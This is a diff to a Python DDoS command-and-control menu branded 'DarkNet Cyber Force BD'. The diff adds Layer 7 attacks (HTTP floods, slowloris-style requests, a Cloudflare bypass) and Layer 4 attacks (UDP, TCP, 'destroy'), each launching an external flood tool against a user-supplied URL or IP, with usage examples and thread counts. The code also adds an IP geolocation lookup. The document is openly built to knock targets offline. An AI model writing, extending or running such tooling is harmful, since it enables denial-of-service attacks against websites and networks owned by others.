@@ -14,25 +14,11 @@ import sys
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-# proxies.txt ফাইল না থাকলে যেন এরর না দেয়, তার ব্যবস্থা
 try:
     proxys = open('proxies.txt').readlines()
     bots = len(proxys)
 except:
     bots = 0
-
-def ascii_vro():
-    clear()
-    print('''
-     / **/|        
-     | == /        
-      |  |         
-      |  |         
-      |  /         
-       |/  
-    ''')
-    time.sleep(0.4)
-    clear()
 
 def si():
     print('\x1b[38;2;0;255;255m[ DCFBD ] | Welcome to DarkNet Cyber Force BD! | Owner: DCFBD | Update v1.1\x1b[0m\n')
@@ -165,23 +151,23 @@ def main():
     menu()
     while(True):
         cnc = input('\x1b[38;2;0;212;14m╔══[C2@DCFBD]\n╚═══➤ \x1b[0m')
-        if cnc in ["layer7", "LAYER7", "L7", "l7"]:
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             layer7()
-        elif cnc in ["layer4", "LAYER4", "L4", "l4"]:
+        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
             layer4()
-        elif cnc in ["amp", "AMP", "amps/games"]:
+        elif cnc == "amp" or cnc == "AMP" or cnc == "amps/games":
             amp_games()
-        elif cnc in ["special", "SPECIAL"]:
+        elif cnc == "special" or cnc == "SPECIAL":
             special()
-        elif cnc in ["rules", "RULES"]:
+        elif cnc == "rules" or cnc == "RULES":
             rules()
-        elif cnc in ["clear", "CLEAR", "cls"]:
+        elif cnc == "clear" or cnc == "CLEAR" or cnc == "cls":
             main()
-        elif cnc in ["ports", "PORTS"]:
+        elif cnc == "ports" or cnc == "PORTS":
             ports()
-        elif cnc in ["tools", "TOOLS"]:
+        elif cnc == "tools" or cnc == "TOOLS":
             tools()
-        elif cnc in ["banner", "BANNERS"]:
+        elif cnc == "banner" or cnc == "BANNERS":
             banners()
         elif cnc == "help":
             print('''
@@ -195,6 +181,124 @@ PORTS   ► SHOW ALL PORTS
 TOOLS   ► SHOW TOOLS
 CLEAR   ► CLEAR TERMINAL
             ''')
+
+# LAYER 7 METHODS & ATTACK COMMANDS
+        elif "crash" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'go run Hulk.go -site {url} -data {method}')
+            except IndexError:
+                print('Usage: crash <url> METHODS<GET/POST>')
+                print('Example: crash http://example.com GET')
+
+        elif "httpflood" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                time_val = cnc.split()[4]
+                os.system(f'go run httpflood.go {url} {thread} {method} {time_val} nil')
+            except IndexError:
+                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
+                print('Example: httpflood http://example.com 15000 get 60')
+
+        elif "slow" in cnc:
+            try:
+                url = cnc.split()[1]
+                time_val = cnc.split()[2]
+                os.system(f'node slow.js {url} {time_val}')
+            except IndexError:
+                print('Usage: slow <url> <time>')
+                print('Example: slow http://vailon.com 60')
+
+        elif "http-raw" in cnc:
+            try:
+                url = cnc.split()[1]
+                time_val = cnc.split()[2]
+                os.system(f'node HTTP-RAW {url} {time_val}')
+            except IndexError:
+                print('Usage: http-raw <url> <time>')
+                print('Example: http-raw http://example.com 60')
+
+        elif "http-socket" in cnc:
+            try:
+                url = cnc.split()[1]
+                per = cnc.split()[2]
+                time_val = cnc.split()[3]
+                os.system(f'node HTTP-SOCKET {url} {per} {time_val}')
+            except IndexError:
+                print('Usage: http-socket <url> <per> <time>')
+                print('Example: http-socket http://example.com 5000 60')
+
+        elif "cf-bypass" in cnc:
+            try:
+                url = cnc.split()[1]
+                time_val = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'node cf.js {url} {time_val} {thread}')
+            except IndexError:
+                print('Usage: cf-bypass <url> <time> <threads>')
+                print('Example: cf-bypass http://example.com 60 1250')
+
+# LAYER 4 METHODS
+        elif "udp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'python2 udp.py {ip} {port} 0 0')
+            except IndexError:
+                print('Usage: udp <ip> <port>')
+                print('Example: udp 1.1.1.1 80')
+
+        elif "tcp" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time_val = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./100UP-TCP {method} {ip} {port} {time_val} {conns}')
+            except IndexError:
+                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: tcp GET 1.1.1.1 80 60 8500')
+
+        elif "std" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./STD-NOSPOOF {ip} {port}')
+            except IndexError:
+                print('Usage: std <ip> <port>')
+                print('Example: std 1.1.1.1 80')
+
+        elif "destroy" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time_val = cnc.split()[3]
+                os.system(f'perl destroy.pl {ip} {port} 65500 {time_val}')
+            except IndexError:
+                print('Usage: destroy <ip> <port> <time>')
+                print('Example: destroy 1.1.1.1 80 60')
+
+# BANNERS & TOOLS
+        elif "troll" in cnc:
+            print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
+            print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
+            print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
+
+        elif "pikachu" in cnc:
+            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
+
+        elif "geoip" in cnc:
+            try:
+                ip = cnc.split()[1]
+                r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
+                print(r.text)
+            except:
+                print('Usage: geoip <ip>')
+
         else:
             try:
                 cmmnd = cnc.split()[0]
